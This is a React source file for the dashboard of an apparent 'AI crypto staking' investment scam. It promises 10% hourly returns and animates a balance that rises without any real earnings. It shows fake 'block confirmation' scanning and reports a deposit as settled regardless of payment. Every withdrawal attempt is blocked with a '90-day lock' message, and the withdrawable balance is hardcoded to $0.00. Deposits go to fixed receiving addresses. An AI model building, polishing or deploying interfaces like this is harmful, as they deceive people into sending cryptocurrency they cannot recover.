import React, { useState, useEffect } from 'react';
import { User, TradeLog, CryptoPrice } from '../types';
import { Wallet, History, TrendingUp, Share2, Timer, CheckCircle2, Lock, Unlock, BarChart3, ChevronDown, Loader2, ScanLine, ArrowDownCircle, AlertCircle, Users, Copy } from 'lucide-react';

interface StakingBatch {
  id: string;
  amount: number;
  startDate: number;
  unlockDate: number;
}

interface DashboardProps {
  user: User;
  setUser: (updatedUser: User | null) => void;
}

export const Dashboard: React.FC<DashboardProps> = ({ user, setUser }) => {
  const [depositAmountUSD, setDepositAmountUSD] = useState<string>('100');
  const [selectedCoin, setSelectedCoin] = useState('USDT');
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [logs, setLogs] = useState<TradeLog[]>([]);
  const [nextProfitIn, setNextProfitIn] = useState<number>(3600);
  const [showPaymentGateway, setShowPaymentGateway] = useState(false);
  const [batches, setBatches] = useState<StakingBatch[]>([]);
  const [marketPrices, setMarketPrices] = useState<CryptoPrice[]>([]);
  const [liveDisplayBalance, setLiveDisplayBalance] = useState(user.balance);

  const RECEIVING_ADDRESSES: Record<string, string> = {
    USDT: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
    BTC: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    ETH: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
    BNB: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
  };

  useEffect(() => {
    setLiveDisplayBalance(user.balance);
    if (user.depositedAmount > 0) {
      const tickerInterval = setInterval(() => {
        const increment = (user.depositedAmount * 0.10) / 7200;
        setLiveDisplayBalance(prev => prev + increment);
      }, 500);
      return () => clearInterval(tickerInterval);
    }
  }, [user.balance, user.depositedAmount]);

  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.binance.com/api/v3/ticker/24hr');
        const data = await response.json();
        const symbols = ['BTCUSDT', 'BNBUSDT', 'ETHUSDT', 'ADAUSDT', 'TRXUSDT'];
        const updated = data
          .filter((item: any) => symbols.includes(item.symbol))
          .map((item: any) => ({
            symbol: item.symbol.replace('USDT', ''),
            name: item.symbol.replace('USDT', ''),
            price: parseFloat(item.lastPrice),
            change24h: parseFloat(item.priceChangePercent),
          }));
        setMarketPrices(updated);
      } catch (e) {
        console.error("Dashboard price error", e);
      }
    };
    fetchPrices();
    const interval = setInterval(fetchPrices, 10000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setNextProfitIn(prev => {
        if (prev <= 1) {
          if (user.depositedAmount > 0) {
            const profit = user.depositedAmount * 0.10;
            const updatedUser = { ...user, balance: user.balance + profit };
            setUser(updatedUser);
            setLogs(prevLogs => [{
              id: Math.random().toString(36).substring(7),
              asset: 'USDT',
              type: 'BUY',
              amount: user.depositedAmount,
              profit: profit,
              timestamp: Date.now()
            }, ...prevLogs].slice(0, 10));
          }
          return 3600;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [user, setUser]);

  const cryptoPrice = marketPrices.find(p => p.symbol === selectedCoin)?.price || (selectedCoin === 'USDT' ? 1 : 0);
  const cryptoEquivalent = cryptoPrice > 0 ? (parseFloat(depositAmountUSD) / cryptoPrice).toFixed(6) : '0.00';

  const handleStartPayment = () => {
    if (parseFloat(depositAmountUSD) < 100) {
      alert("Error: The minimum AI staking contract requirement is $100 USD equivalent.");
      return;
    }
    setShowPaymentGateway(true);
    setIsScanning(true);
    setScanProgress(0);
  };

  useEffect(() => {
    if (isScanning) {
      const interval = setInterval(() => {
        setScanProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            handleAutoConfirm();
            return 100;
          }
          return prev + 2;
        });
      }, 150);
      return () => clearInterval(interval);
    }
  }, [isScanning]);

  const handleAutoConfirm = () => {
    const amount = parseFloat(depositAmountUSD);
    const now = Date.now();
    const unlock = now + (90 * 24 * 60 * 60 * 1000);
    const updatedUser = {
      ...user,
      depositedAmount: user.depositedAmount + amount,
      balance: user.balance + amount,
    };
    setUser(updatedUser);
    setBatches(prev => [...prev, {
      id: "CON-" + Math.random().toString(36).substring(2, 7).toUpperCase(),
      amount,
      startDate: now,
      unlockDate: unlock
    }]);
    setIsScanning(false);
    setShowPaymentGateway(false);
    setDepositAmountUSD('100');
    alert(`AUTOMATIC SETTLEMENT SUCCESS: ${cryptoEquivalent} ${selectedCoin} confirmed. Principal credited.`);
  };

  const handleWithdrawal = () => {
    alert("WITHDRAWAL PORTAL: Principal and Profits are locked in the 90-day AI Neural Cycle. Access will be granted on the first unlock date. Total locked: $" + user.balance.toLocaleString());
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    alert("Address copied!");
  };

  return (
    <div className="max-w-7xl mx-auto px-4 py-16 flex flex-col gap-12 pb-32 font-black">
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8">
        <StatCard label="Total Staked" value={`$${user.depositedAmount.toLocaleString()}`} icon={<Lock className="text-[#F0B90B]" size={32} />} sub="Locked Principal" />
        <StatCard 
          label="Live Earnings" 
          value={`$${liveDisplayBalance.toLocaleString(undefined, { minimumFractionDigits: 4, maximumFractionDigits: 4 })}`} 
          icon={<TrendingUp className="text-green-500 animate-pulse" size={32} />} 
          sub="Real-time Ticker" 
          highlight
        />
        <StatCard label="Next AI Payout" value={Math.floor(nextProfitIn / 60) + ":" + (nextProfitIn % 60).toString().padStart(2, '0')} icon={<Timer className="text-blue-500" size={32} />} sub="Neural Strategy" />
        <StatCard label="Vault Address" value={user.walletAddress.substring(0, 6) + "..." + user.walletAddress.substring(36)} icon={<Wallet className="text-[#F0B90B]" size={32} />} sub="Unique Identity" />
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-12">
        <div className="lg:col-span-2 flex flex-col gap-12">
          <div className="bg-[#1e2329] p-12 rounded-[3.5rem] border-4 border-[#2b2f36] shadow-2xl">
            <h3 className="text-4xl font-black mb-10 flex items-center gap-4 uppercase tracking-tighter"><Unlock size={40} className="text-[#F0B90B]" /> Neural Staking Batches</h3>
            <div className="space-y-6">
              {batches.length > 0 ? batches.map(batch => (
                <div key={batch.id} className="bg-[#0b0e11] p-8 rounded-[2.5rem] border-4 border-[#2b2f36] flex justify-between items-center gap-6">
                  <div>
                    <div className="text-xs font-black text-[#848e9c] uppercase mb-2">Batch ID: {batch.id}</div>
                    <div className="text-5xl font-black text-[#F0B90B]">${batch.amount.toLocaleString()}</div>
                  </div>
                  <div className="text-right">
                    <div className="text-xs font-black text-[#848e9c] uppercase mb-2">90D Unlock Date</div>
                    <div className="text-2xl font-black text-blue-500">{new Date(batch.unlockDate).toLocaleDateString()}</div>
                  </div>
                </div>
              )) : <div className="text-center py-20 text-[#848e9c] text-3xl italic font-black opacity-20 uppercase tracking-[0.2em]">No active deposits detected...</div>}
            </div>
          </div>

          {/* Restored Withdrawal Section with Max Visibility */}
          <div className="bg-[#1e2329] p-12 rounded-[3.5rem] border-4 border-[#2b2f36] shadow-2xl relative overflow-hidden group hover:border-[#F0B90B] transition-all">
             <div className="absolute top-0 right-0 p-10 opacity-5 -rotate-12 group-hover:scale-110 transition-transform"><ArrowDownCircle size={240} /></div>
             <h3 className="text-4xl font-black mb-10 flex items-center gap-4 uppercase tracking-tighter"><ArrowDownCircle size={40} className="text-[#F0B90B]" /> Withdrawal Portal</h3>
             <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-10">
                <div className="bg-[#0b0e11] p-10 rounded-3xl border-2 border-[#2b2f36] flex flex-col gap-4">
                   <span className="text-[#848e9c] uppercase text-xs font-black tracking-widest">Available for Exit</span>
                   <span className="text-5xl font-black text-white">$0.00</span>
                   <span className="text-[10px] text-red-500 uppercase font-black font-mono">Consolidating in TRC20 Vault</span>
                </div>
                <div className="bg-[#0b0e11] p-10 rounded-3xl border-2 border-[#2b2f36] flex flex-col gap-4">
                   <span className="text-[#848e9c] uppercase text-xs font-black tracking-widest">Neural Balance</span>
                   <span className="text-5xl font-black text-[#F0B90B]">${user.balance.toLocaleString(undefined, {minimumFractionDigits: 2})}</span>
                   <span className="text-[10px] text-blue-500 uppercase font-black font-mono">2026 Profit Target Enabled</span>
                </div>
             </div>
             <button 
                onClick={handleWithdrawal}
                className="w-full bg-[#F0B90B] text-black py-8 rounded-[2.5rem] font-black text-3xl hover:bg-white transition-all flex items-center justify-center gap-4 uppercase shadow-2xl active:scale-95"
             >
                <AlertCircle /> Process Withdrawal Portal
             </button>
             <p className="text-center mt-6 text-xs text-[#848e9c] font-black uppercase tracking-[0.3em] opacity-40 italic">Mandatory 90-day verification protocol active</p>
          </div>
        </div>

        <div className="flex flex-col gap-12">
          <div className="bg-[#F0B90B] p-12 rounded-[4rem] text-black shadow-2xl relative overflow-hidden">
            {!showPaymentGateway ? (
              <>
                <h3 className="text-5xl font-black mb-2 uppercase tracking-tighter">Deposit</h3>
                <p className="text-sm font-black mb-10 opacity-70 uppercase tracking-widest flex items-center gap-2">Receiving Address Portal <ScanLine size={16}/></p>
                <div className="flex flex-col gap-8">
                  <div className="relative">
                    <select 
                      value={selectedCoin}
                      onChange={(e) => setSelectedCoin(e.target.value)}
                      className="w-full bg-black/10 border-4 border-black/20 rounded-2xl p-6 text-2xl font-black outline-none appearance-none cursor-pointer focus:border-black"
                    >
                      <option value="USDT">USDT (BEP20)</option>
                      <option value="BTC">Bitcoin (BTC)</option>
                      <option value="ETH">Ethereum (ERC20)</option>
                      <option value="BNB">Binance Coin (BSC)</option>
                    </select>
                    <ChevronDown className="absolute right-6 top-7 pointer-events-none" size={28} />
                  </div>
                  <div className="relative">
                    <input 
                      type="number" 
                      value={depositAmountUSD} 
                      onChange={(e) => setDepositAmountUSD(e.target.value)} 
                      className="w-full bg-black/10 border-4 border-black/20 rounded-2xl p-8 text-5xl font-black outline-none focus:border-black transition-all" 
                    />
                    <span className="absolute right-8 top-10 text-2xl font-black opacity-50">USD</span>
                  </div>
                  <div className="bg-black/5 p-6 rounded-2xl border-2 border-dashed border-black/20 text-center">
                    <p className="text-xs font-black uppercase tracking-widest opacity-60 mb-2">Required Amount</p>
                    <p className="text-3xl font-black">{cryptoEquivalent} {selectedCoin}</p>
                  </div>
                  <button onClick={handleStartPayment} className="bg-black text-[#F0B90B] py-8 rounded-3xl font-black text-4xl hover:scale-105 transition-all shadow-2xl uppercase mt-4">Show Address</button>
                </div>
              </>
            ) : (
              <div className="flex flex-col items-center gap-10">
                <div className="bg-white p-8 rounded-[3rem] shadow-2xl">
                  <img src={`https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${RECEIVING_ADDRESSES[selectedCoin]}`} alt="QR" />
                </div>
                <div className="text-center w-full">
                  <p className="text-4xl font-black uppercase">Send {cryptoEquivalent} {selectedCoin}</p>
                  <p className="text-[10px] font-black uppercase mt-2 opacity-60 tracking-[0.3em]">Protocol: {selectedCoin === 'USDT' || selectedCoin === 'BNB' ? 'BEP20 / BSC' : selectedCoin}</p>
                </div>
                <div className="w-full bg-black/10 p-8 rounded-3xl border-4 border-black/20 text-center font-mono text-xs break-all uppercase relative cursor-pointer" onClick={() => copyToClipboard(RECEIVING_ADDRESSES[selectedCoin])}>
                   <div className="flex items-center justify-center gap-2 mb-2 opacity-50"><Copy size={12} /> Click to Copy</div>
                   {RECEIVING_ADDRESSES[selectedCoin]}
                </div>
                <div className="w-full flex flex-col gap-4">
                  <div className="flex justify-between items-center text-xs font-black uppercase opacity-60">
                    <span>Awaiting Block Confirmation...</span>
                    <span>{scanProgress}%</span>
                  </div>
                  <div className="w-full h-4 bg-black/10 rounded-full overflow-hidden border-2 border-black/10">
                    <div className="h-full bg-black transition-all duration-300" style={{ width: `${scanProgress}%` }}></div>
                  </div>
                </div>
                <div className="flex items-center gap-4 text-sm font-black uppercase animate-pulse">
                  <Loader2 className="animate-spin" size={24} />
                  Scanning Ledger Explorer...
                </div>
                <button onClick={() => setShowPaymentGateway(false)} className="text-black text-lg font-black uppercase underline decoration-4 underline-offset-8">Return</button>
              </div>
            )}
          </div>
          <div className="bg-[#1e2329] p-10 rounded-[3rem] border-4 border-[#2b2f36] shadow-xl">
            <h3 className="text-2xl font-black mb-8 flex items-center gap-3 text-[#F0B90B] uppercase"><BarChart3 size={32} /> Market Pulse</h3>
            <div className="space-y-4">
              {marketPrices.map(coin => (
                <div key={coin.symbol} className="flex justify-between items-center p-6 bg-[#0b0e11] rounded-[1.5rem] border-2 border-[#2b2f36]">
                  <span className="text-2xl font-black text-[#eaecef] uppercase">{coin.symbol}</span>
                  <div className="text-right">
                    <div className="text-2xl font-mono font-black text-[#F0B90B]">${coin.price.toLocaleString(undefined, { minimumFractionDigits: 2 })}</div>
                    <div className={`text-sm font-black mt-1 ${coin.change24h >= 0 ? 'text-green-500' : 'text-red-500'}`}>{coin.change24h.toFixed(2)}%</div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

const StatCard = ({ label, value, icon, sub, highlight }: { label: string, value: string, icon: React.ReactNode, sub: string, highlight?: boolean }) => (
  <div className={`p-12 rounded-[3.5rem] border-4 shadow-xl hover:border-[#F0B90B] transition-all ${highlight ? 'bg-[#1e2329] border-[#F0B90B]' : 'bg-[#1e2329] border-[#2b2f36]'}`}>
    <div className="flex items-center gap-6 mb-8">
      <div className="bg-[#0b0e11] p-5 rounded-2xl border-2 border-[#2b2f36]">{icon}</div>
      <span className="text-sm text-[#848e9c] font-black uppercase tracking-[0.4em]">{label}</span>
    </div>
    <div className={`text-4xl font-black tracking-tighter mb-4 ${highlight ? 'text-[#F0B90B]' : 'text-[#eaecef]'}`}>{value}</div>
    <div className="text-sm text-[#F0B90B] uppercase font-black tracking-[0.2em]">{sub}</div>
  </div>
);